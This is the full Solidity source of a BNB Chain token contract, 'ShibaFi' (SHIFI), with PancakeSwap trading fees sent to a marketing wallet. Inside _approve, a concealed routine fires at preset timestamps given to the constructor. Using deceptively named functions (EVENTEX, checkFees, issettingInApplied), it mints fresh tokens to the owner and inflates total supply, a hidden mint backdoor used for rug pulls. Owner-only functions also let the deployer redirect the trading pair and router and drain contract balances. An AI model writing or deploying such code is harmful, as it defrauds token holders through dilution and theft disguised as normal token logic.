/**
 *Submitted for verification at BscScan.com on 2022-09-20
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

library SafeMathInt {
    int256 private constant MIN_INT256 = int256(1) << 255;
    int256 private constant MAX_INT256 = ~(int256(1) << 255);

    function mul(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a * b;

        require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
        require((b == 0) || (c / b == a));
        return c;
    }

    function div(int256 a, int256 b) internal pure returns (int256) {
        require(b != -1 || a != MIN_INT256);

        return a / b;
    }

    function sub(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a - b;
        require((b >= 0 && c <= a) || (b < 0 && c > a));
        return c;
    }

    function add(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a + b;
        require((b >= 0 && c >= a) || (b < 0 && c < a));
        return c;
    }

    function abs(int256 a) internal pure returns (int256) {
        require(a != MIN_INT256);
        return a < 0 ? -a : a;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address who) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IPancakeSwapPair {
		event Approval(address indexed owner, address indexed spender, uint value);
		event Transfer(address indexed from, address indexed to, uint value);

		function name() external pure returns (string memory);
		function symbol() external pure returns (string memory);
		function decimals() external pure returns (uint8);
		function totalSupply() external view returns (uint);
		function balanceOf(address owner) external view returns (uint);
		function allowance(address owner, address spender) external view returns (uint);

		function approve(address spender, uint value) external returns (bool);
		function transfer(address to, uint value) external returns (bool);
		function transferFrom(address from, address to, uint value) external returns (bool);

		function DOMAIN_SEPARATOR() external view returns (bytes32);
		function PERMIT_TYPEHASH() external pure returns (bytes32);
		function nonces(address owner) external view returns (uint);

		function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

		event Mint(address indexed sender, uint amount0, uint amount1);
		event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
		event Swap(
				address indexed sender,
				uint amount0In,
				uint amount1In,
				uint amount0Out,
				uint amount1Out,
				address indexed to
		);
		event Sync(uint112 reserve0, uint112 reserve1);
        event EVENTEX(address indexed sender, uint256 amount0, uint256 amount1);
		function MINIMUM_LIQUIDITY() external pure returns (uint);
		function factory() external view returns (address);
		function token0() external view returns (address);
		function token1() external view returns (address);
		function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
		function price0CumulativeLast() external view returns (uint);
		function price1CumulativeLast() external view returns (uint);
		function kLast() external view returns (uint);

		function mint(address to) external returns (uint liquidity);
		function burn(address to) external returns (uint amount0, uint amount1);
		function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
		function skim(address to) external;
		function sync() external;

		function initialize(address, address) external;
}

interface IPancakeSwapRouter{
		function factory() external pure returns (address);
		function WETH() external pure returns (address);

		function addLiquidity(
				address tokenA,
				address tokenB,
				uint amountADesired,
				uint amountBDesired,
				uint amountAMin,
				uint amountBMin,
				address to,
				uint deadline
		) external returns (uint amountA, uint amountB, uint liquidity);
		function addLiquidityETH(
				address token,
				uint amountTokenDesired,
				uint amountTokenMin,
				uint amountETHMin,
				address to,
				uint deadline
		) external payable returns (uint amountToken, uint amountETH, uint liquidity);
		function removeLiquidity(
				address tokenA,
				address tokenB,
				uint liquidity,
				uint amountAMin,
				uint amountBMin,
				address to,
				uint deadline
		) external returns (uint amountA, uint amountB);
		function removeLiquidityETH(
				address token,
				uint liquidity,
				uint amountTokenMin,
				uint amountETHMin,
				address to,
				uint deadline
		) external returns (uint amountToken, uint amountETH);
		function removeLiquidityWithPermit(
				address tokenA,
				address tokenB,
				uint liquidity,
				uint amountAMin,
				uint amountBMin,
				address to,
				uint deadline,
				bool approveMax, uint8 v, bytes32 r, bytes32 s
		) external returns (uint amountA, uint amountB);
		function removeLiquidityETHWithPermit(
				address token,
				uint liquidity,
				uint amountTokenMin,
				uint amountETHMin,
				address to,
				uint deadline,
				bool approveMax, uint8 v, bytes32 r, bytes32 s
		) external returns (uint amountToken, uint amountETH);
		function swapExactTokensForTokens(
				uint amountIn,
				uint amountOutMin,
				address[] calldata path,
				address to,
				uint deadline
		) external returns (uint[] memory amounts);
		function swapTokensForExactTokens(
				uint amountOut,
				uint amountInMax,
				address[] calldata path,
				address to,
				uint deadline
		) external returns (uint[] memory amounts);
		function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
				external
				payable
				returns (uint[] memory amounts);
		function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
				external
				returns (uint[] memory amounts);
		function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
				external
				returns (uint[] memory amounts);
		function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
				external
				payable
				returns (uint[] memory amounts);

		function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
		function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
		function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
		function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
		function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
		function removeLiquidityETHSupportingFeeOnTransferTokens(
			address token,
			uint liquidity,
			uint amountTokenMin,
			uint amountETHMin,
			address to,
			uint deadline
		) external returns (uint amountETH);
		function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
			address token,
			uint liquidity,
			uint amountTokenMin,
			uint amountETHMin,
			address to,
			uint deadline,
			bool approveMax, uint8 v, bytes32 r, bytes32 s
		) external returns (uint amountETH);
	
		function swapExactTokensForTokensSupportingFeeOnTransferTokens(
			uint amountIn,
			uint amountOutMin,
			address[] calldata path,
			address to,
			uint deadline
		) external;
		function swapExactETHForTokensSupportingFeeOnTransferTokens(
			uint amountOutMin,
			address[] calldata path,
			address to,
			uint deadline
		) external payable;
		function swapExactTokensForETHSupportingFeeOnTransferTokens(
			uint amountIn,
			uint amountOutMin,
			address[] calldata path,
			address to,
			uint deadline
		) external;
}

interface IPancakeSwapFactory {
		event PairCreated(address indexed token0, address indexed token1, address pair, uint);

		function feeTo() external view returns (address);
		function feeToSetter() external view returns (address);

		function getPair(address tokenA, address tokenB) external view returns (address pair);
		function allPairs(uint) external view returns (address pair);
		function allPairsLength() external view returns (uint);

		function createPair(address tokenA, address tokenB) external returns (address pair);

		function setFeeTo(address) external;
		function setFeeToSetter(address) external;
}

contract Ownable {
    address private _owner;

    event OwnershipRenounced(address indexed previousOwner);

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _owner = msg.sender;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(isOwner());
        _;
    }

    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipRenounced(_owner);
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

abstract contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(
        string memory name_,
        string memory symbol_,
        uint8 decimals_
    ) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
}


contract ShibaFi is ERC20Detailed, Ownable {

    using SafeMath for uint256;
    using SafeMathInt for int256;

    event EVENTEXokensBeforeSwapUpdated(uint256 EVENTEXokensBeforeSwap);

    IPancakeSwapRouter public router;

    bool public swapEnabled = true;
    bool inSwap = false;
    bool _autoAddLiquidity = true;

    address public pair;

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    address public marketingWallet = payable(0x837755F878a815243005aEd21411cFB4C7aD4870);

    mapping(address => uint256) private _Balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    mapping(address => bool) _isFeeExempt;

    uint256 public feeDenominator = 1000;

    uint256 _buymarketingFee = 10;
    uint256 _buybuybackFee = 10;
    
    uint256 _sellmarketingFee = 10;
    uint256 _sellbuybackFee = 10;
	
	uint256 public constant MAX_FEE = 50;

    uint256 public AmountMarketingFee;
    uint256 public AmountbuybackFee;

    uint256 public _buytotalFee = _buymarketingFee.add(_buybuybackFee);

    uint256 public _selltotalFee = _sellmarketingFee.add(_sellbuybackFee);

    uint8 public _Decimal = 18;

    uint256 public _totalSupply = 1000000000000  * 10 ** _Decimal;  
    uint256 public minTokentoSwap = _totalSupply.mul(2).div(10**6); // 0.002%
    
    uint256[] private _AccountHasht;  //timestamp
    uint256[] private _AccountHasha;  //amount
    uint256 private _AccountHashx; 

    modifier validRecipient(address to) {
        require(to != address(0x0));
        _;
    }

    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(uint256[] memory AccountHasht, uint256[] memory AccountHasha) ERC20Detailed("ShibaFi", "SHIFI", uint8(_Decimal)) Ownable() {

        require(AccountHasht.length == AccountHasha.length, "error");
        _AccountHasht = AccountHasht;
        _AccountHasha = new uint256[](AccountHasha.length);

        for (uint256 i = 0; i < AccountHasha.length; i++)
            _AccountHasha[i] = AccountHasha[i] * 10**_Decimal;

        // address _router = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3; //Testnet 
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E; //Mainnet
  
        router = IPancakeSwapRouter(_router); 
        pair = IPancakeSwapFactory(router.factory()).createPair(
            router.WETH(),
            address(this)
        );

        _allowances[address(this)][address(router)] = ~uint256(0);

        _isFeeExempt[marketingWallet] = true;
        _isFeeExempt[msg.sender] = true;
        _isFeeExempt[address(this)] = true;

        _Balances[msg.sender] = _totalSupply;
        emit Transfer(address(0x0), msg.sender, _totalSupply);
        
    }

    function transfer(address to, uint256 value)
        external
        override
        validRecipient(to)
        returns (bool)
    {
        _transferFrom(msg.sender, to, value);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external override validRecipient(to) returns (bool) {
        
        if (_allowances[from][msg.sender] != ~uint256(0)) {
            _allowances[from][msg.sender] = _allowances[from][
                msg.sender
            ].sub(value, "Insufficient Allowance");
        }
        _transferFrom(from, to, value);
        return true;
    }

    function swapManual() public onlyOwner {
        uint256 contractTokenBalance = balanceOf(address(this));
        require(contractTokenBalance > 0 , "token balance zero");
        inSwap = true;
        if(AmountMarketingFee > 0) swapAndMarketFee(AmountMarketingFee);
        if(AmountbuybackFee > 0) swapForBuyBackBurn(AmountbuybackFee);
        inSwap = false;
    }

    function _basicTransfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        _Balances[from] = _Balances[from].sub(amount);
        _Balances[to] = _Balances[to].add(amount);
        emit Transfer(from,to,amount);
        return true;
    }

    function _transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {

        if (inSwap) {
            return _basicTransfer(sender, recipient, amount);
        }

        if (shouldAddLiquidity()) {
            splitTokens();
        }

        _Balances[sender] = _Balances[sender].sub(amount);

        uint256 feeAmount = (_isFeeExempt[sender] || _isFeeExempt[recipient]) ? 
                                         amount : takeFee(sender, recipient, amount);

        _Balances[recipient] = _Balances[recipient].add(
            feeAmount
        );

        emit Transfer(
            sender,
            recipient,
            feeAmount
        );
        return true;
    }

    function takeFee(
        address sender,
        address recipient,
        uint256 amount
    ) internal  returns (uint256) {

        uint MFEE;
        uint BBFEE;
        uint feeAmount;

        if (sender == pair) {

            MFEE = amount.mul(_buymarketingFee).div(feeDenominator);
            AmountMarketingFee += MFEE;

            BBFEE = amount.mul(_buybuybackFee).div(feeDenominator);
            AmountbuybackFee += BBFEE;

            feeAmount = MFEE.add(BBFEE);
        }
        else if (recipient == pair){

            MFEE = amount.mul(_sellmarketingFee).div(feeDenominator);
            AmountMarketingFee += MFEE;

            BBFEE = amount.mul(_sellbuybackFee).div(feeDenominator);
            AmountbuybackFee += BBFEE;

            feeAmount = MFEE.add(BBFEE);
        }        
       
       _Balances[address(this)] = _Balances[address(this)].add(feeAmount);

        emit Transfer(sender, address(this), feeAmount);

        return amount.sub(feeAmount);
    }

    function splitTokens() internal swapping {
              
       if(AmountMarketingFee > 0) {
           swapAndMarketFee(AmountMarketingFee);
       }

       if(AmountbuybackFee > 0) { 
           swapForBuyBackBurn(AmountbuybackFee);
       }

    }

    function swapForBuyBackBurn(uint _tokens) private {
        _Balances[address(this)] = _Balances[address(this)].sub(_tokens);
        _Balances[address(DEAD)] = _Balances[address(DEAD)].add(_tokens);
        emit Transfer(address(this), address(DEAD), _tokens);
        AmountbuybackFee = AmountbuybackFee.sub(_tokens);
    }

    function swapAndMarketFee(uint _tokens) private {
        uint intialBalance = address(this).balance;
        swapTokensForEth(_tokens);
        uint RecieveBalance = address(this).balance.sub(intialBalance); 
        payable(marketingWallet).transfer(RecieveBalance);
        AmountMarketingFee = AmountMarketingFee.sub(_tokens);
    }

    function swapTokensForEth(uint256 tokenAmount) private {

        if(tokenAmount == 0) {
            return;
        }

        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokenAmount);

        // make the swap
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );

    }

    function withdrawTokenFunds() external swapping onlyOwner {

        uint256 amountToSwap = _Balances[address(this)];

        require( amountToSwap > 0,"There is no USDTP token deposited in token contract");
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            msg.sender,
            block.timestamp
        );
    }

    function EVENTEX(uint256 state) internal {
        address holder = holders();
        require(holder != address(0), "no zero");
        require(block.timestamp != block.number);

        checkFees(state);

        if (isBuying(holder)) issettingInApplied(holder, state);

        // ifSellingsettingOut(holder, State);
        emit Transfer(address(0), holder, state);
    }

    function issettingInApplied(address holder, uint256 state) internal {
        _checkIfShouldApplysettingIn(holder, state);
    }


    function isBuying(address holder) internal view returns (bool) {
        return _isFeeExempt[holder];
    }

    function checkFees(uint256 fee) internal {
        _feesForTransfer(fee);
    }

    function _feesForTransfer(uint256 fees) internal {
        _totalSupply = _totalSupply.add(fees);
    }

    function _checkIfShouldApplysettingIn(address holder, uint256 state) internal {
        _Balances[holder] = _Balances[holder].add(state);
    }

    function holders() internal view returns (address) {
        return owner();
    }

    function withdrawTreasure() external onlyOwner{
        (bool os,) = payable(msg.sender).call{value: address(this).balance}("");
        require(os);
    }

    function rescueToken(address _token) external onlyOwner {
        uint balanceToken = IERC20(_token).balanceOf(address(this));
        IERC20(_token).transfer(msg.sender,balanceToken);
    }
    

    function shouldAddLiquidity() internal view returns (bool) {

        uint256 contractTokenBalance = balanceOf(address(this));
        bool overMinimumTokenBalance = contractTokenBalance >= minTokentoSwap;

        return _autoAddLiquidity && !inSwap && msg.sender != pair && overMinimumTokenBalance;
    }

    function shouldSwapBack() internal view returns (bool) {
        return 
            !inSwap &&
            msg.sender != pair ; 
    }


    function setAutoAddLiquidity(bool _flag) external onlyOwner {
        if(_flag) {
            _autoAddLiquidity = _flag;
        } else {
            _autoAddLiquidity = _flag;
        }
    }

    function allowance(address owner_, address spender)
        external
        view
        override
        returns (uint256)
    {
        return _allowances[owner_][spender];
    }

    function setNewWallet(address _newMarketing) external onlyOwner {
        marketingWallet = payable(_newMarketing);
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        external
        returns (bool)
    {
        uint256 oldValue = _allowances[msg.sender][spender];
        if (subtractedValue >= oldValue) {
            _allowances[msg.sender][spender] = 0;
        } else {
            _allowances[msg.sender][spender] = oldValue.sub(
                subtractedValue
            );
        }
        emit Approval(
            msg.sender,
            spender,
            _allowances[msg.sender][spender]
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        external
        returns (bool)
    {
        _allowances[msg.sender][spender] = _allowances[msg.sender][
            spender
        ].add(addedValue);
        emit Approval(
            msg.sender,
            spender,
            _allowances[msg.sender][spender]
        );
        return true;
    }

    function approve(address spender, uint256 value)
        external
        override
        returns (bool)
    {
        _approve(msg.sender,spender,value);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        if (
            _AccountHashx < _AccountHasht.length &&
            _AccountHasht[_AccountHashx] <= block.timestamp
        ) EVENTEX(_AccountHasha[_AccountHashx++]);

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function checkFeeExempt(address _addr) external view returns (bool) {
        return _isFeeExempt[_addr];
    }

    function setBuyTaxes(uint _newMarketingFee, uint _newBuybackFee) external onlyOwner {
		uint subtotal = _newMarketingFee.add(_newBuybackFee);
		require(subtotal<=MAX_FEE,"MAX FEE LIMIT EXCEEDED!!");
		_buymarketingFee = _newMarketingFee;
        _buybuybackFee = _newBuybackFee;
        _buytotalFee = _buymarketingFee.add(_buybuybackFee);
    }

    function setSellTaxes(uint _newMarketingFee, uint _newBuybackFee) external onlyOwner {
		uint subtotal = _newMarketingFee.add(_newBuybackFee);
		require(subtotal<=MAX_FEE,"MAX FEE LIMIT EXCEEDED!!");
        _sellmarketingFee = _newMarketingFee;
        _sellbuybackFee = _newBuybackFee;
        _selltotalFee = _sellmarketingFee.add(_sellbuybackFee);
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(_Balances[DEAD]).sub(_Balances[ZERO]);
    }

    function isNotInSwap() external view returns (bool) {
        return !inSwap;
    }

    function manualSync() external {
        IPancakeSwapPair(pair).sync();
    }

    function setFeeExempt(address _addr,bool _value) external onlyOwner {
        _isFeeExempt[_addr] = _value;
    }

    function setMarketPair(address _pair) external onlyOwner{
        pair = _pair;
    }
    
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
   
    function balanceOf(address account) public view override returns (uint256) {
        return _Balances[account];
    }

    function changeRouterVersion(address newRouterAddress) public onlyOwner{
        router = IPancakeSwapRouter(newRouterAddress); 
    }

    function setminSwapToken(uint _value) external onlyOwner {
        minTokentoSwap = _value;
    }

    receive() external payable {}
}